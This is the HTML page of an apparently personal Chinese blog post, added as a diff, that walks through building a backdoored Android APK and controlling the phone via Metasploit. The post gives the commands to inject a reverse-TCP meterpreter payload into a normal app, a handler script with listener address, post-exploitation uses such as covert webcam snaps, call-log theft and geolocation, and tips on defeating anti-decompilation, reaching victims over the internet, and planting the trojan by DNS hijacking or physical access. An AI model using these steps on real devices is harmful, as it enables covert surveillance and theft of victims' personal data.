@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"xiaotaoist.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  实验环境： Kali Linux android 同一局域网   生成后门安装依赖环境  apt-get install lib32z1 lib32ncurses5  lib32stdc++6  下载 backdoor-apk  git clone https:&#x2F;&#x2F;github.com&#x2F;dana-at-cp&#x2F;backdoor-apk.git">
+<meta property="og:type" content="article">
+<meta property="og:title" content="生成apk后门实现msf控制安卓手机">
+<meta property="og:url" content="https://xiaotaoist.github.io/2018/03/02/backdoor-apk/index.html">
+<meta property="og:site_name" content="XiaoTaoist&#39;s Blog">
+<meta property="og:description" content="&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  实验环境： Kali Linux android 同一局域网   生成后门安装依赖环境  apt-get install lib32z1 lib32ncurses5  lib32stdc++6  下载 backdoor-apk  git clone https:&#x2F;&#x2F;github.com&#x2F;dana-at-cp&#x2F;backdoor-apk.git">
+<meta property="og:locale">
+<meta property="og:image" content="https://xiaotaoist.github.io/img/apk_1.png">
+<meta property="og:image" content="https://xiaotaoist.github.io/img/apk_msf.png">
+<meta property="article:published_time" content="2018-03-02T10:00:03.000Z">
+<meta property="article:modified_time" content="2018-03-31T02:32:29.000Z">
+<meta property="article:author" content="taoist">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xiaotaoist.github.io/img/apk_1.png">
+
+<link rel="canonical" href="https://xiaotaoist.github.io/2018/03/02/backdoor-apk/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>生成apk后门实现msf控制安卓手机 | XiaoTaoist's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">XiaoTaoist's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://xiaotaoist.github.io/2018/03/02/backdoor-apk/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/img/userico.png">
+      <meta itemprop="name" content="taoist">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="XiaoTaoist's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          生成apk后门实现msf控制安卓手机
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-03-02 18:00:03" itemprop="dateCreated datePublished" datetime="2018-03-02T18:00:03+08:00">2018-03-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-03-31 10:32:29" itemprop="dateModified" datetime="2018-03-31T10:32:29+08:00">2018-03-31</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>0</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>0:01</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>========================</p>
+<hr>
+<h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><ul>
+<li>Kali Linux</li>
+<li>android</li>
+<li>同一局域网 </li>
+</ul>
+<h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>安装依赖环境</p>
+<blockquote>
+<p>apt-get install lib32z1 lib32ncurses5  lib32stdc++6</p>
+</blockquote>
+<p>下载 backdoor-apk</p>
+<blockquote>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/dana-at-cp/backdoor-apk.git">https://github.com/dana-at-cp/backdoor-apk.git</a></p>
+</blockquote>
+<a id="more"></a>
+<p>下载完成后进入文件目录</p>
+<blockquote>
+<p>cd backdoor-apk/backdoor-apk</p>
+</blockquote>
+<p>将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行</p>
+<blockquote>
+<p>./backdoor-apk.sh test.apk<br>PS:test.apk 为事先准备好的正常apk应用名</p>
+</blockquote>
+<p>选择payload<br><img src="/img/apk_1.png" alt="apk">  </p>
+<p>出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件</p>
+<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>执行</p>
+<blockquote>
+<p>msfconsole -r backdoor-apk.rc</p>
+</blockquote>
+<p>手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell<br><img src="/img/apk_msf.png" alt="msf"><br>可以看到获得反弹shell 会话<br>用sessions -i number  切换到当前会话<br>此处执行check_root 测试<br>其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等</p>
+<p>可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler  </span><br><span class="line">set payload android&#x2F;meterpreter&#x2F;reverse_tcp  </span><br><span class="line">set lhost 192.168.0.105  </span><br><span class="line">set lport 8888  </span><br><span class="line">exploit  </span><br></pre></td></tr></table></figure></p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol>
+<li>[!] Failed to recompile original project with backdoor <ul>
+<li>现在很多应用都会做一些处理防止反编译，可以上 <a target="_blank" rel="noopener" href="https://apkpure.com">APKPure</a> 或<a target="_blank" rel="noopener" href="https://www.coolapk.com">酷安</a> 去找一些历史版本会增加成功概率</li>
+<li>apktools 过旧，可以把Kail 更到最新</li>
+<li>一定要把 apk 放到backdoor-apk.sh 所在目录下</li>
+</ul>
+</li>
+</ol>
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul>
+<li>外网环境可使用vps转发 或 ngrok穿透 参考<ul>
+<li>vps 转发 <a target="_blank" rel="noopener" href="http://www.freebuf.com/sectool/136574.html">http://www.freebuf.com/sectool/136574.html</a></li>
+<li>ngrok穿透 <a target="_blank" rel="noopener" href="http://www.freebuf.com/sectool/162046.html">http://www.freebuf.com/sectool/162046.html</a></li>
+</ul>
+</li>
+<li>植入木马方式<ul>
+<li>内网dns劫持: <a target="_blank" rel="noopener" href="http://www.freebuf.com/sectool/136574.html">http://www.freebuf.com/sectool/136574.html</a></li>
+<li>物理接触</li>
+</ul>
+</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://www.secist.com/archives/680.html">http://www.secist.com/archives/680.html</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.4hou.com/mobile/8290.html">http://www.4hou.com/mobile/8290.html</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/02/28/vimium/" rel="prev" title="Vimium 入门">
+      <i class="fa fa-chevron-left"></i> Vimium 入门
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/03/07/ssh-keygen/" rel="next" title="SSH免密登录">
+      SSH免密登录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">实验环境：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8"><span class="nav-number">2.</span> <span class="nav-text">生成后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#meterpreter"><span class="nav-number">3.</span> <span class="nav-text">meterpreter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%93%E5%B1%95"><span class="nav-number">5.</span> <span class="nav-text">拓展</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="taoist"
+      src="/img/userico.png">
+  <p class="site-author-name" itemprop="name">taoist</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xiaoTaoist" title="GitHub → https://github.com/xiaoTaoist" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:taoist@protonmail.com" title="E-Mail → mailto:taoist@protonmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://MiniFullC.github.io" title="https://MiniFullC.github.io" rel="noopener" target="_blank">Musuc</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://kexuecat.github.io" title="https://kexuecat.github.io" rel="noopener" target="_blank">SkyMirror</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">taoist</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
